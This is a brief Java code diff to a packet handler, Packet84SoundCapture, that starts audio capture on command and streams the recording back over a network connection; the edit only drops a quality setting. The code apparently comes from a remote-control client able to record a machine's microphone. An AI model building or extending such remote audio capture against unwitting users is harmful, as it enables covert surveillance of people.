@@ -9,9 +9,8 @@ public class Packet84SoundCapture extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		if (Connection.readBoolean()) {
-			int quality = Connection.readInt();
 			Connection.addToSendQueue(new Packet58SoundCapture());
-			Sound.initialize(quality);
+			Sound.initialize();
 			Sound.write(Connection.dos);
 			
 			Connection.lock();
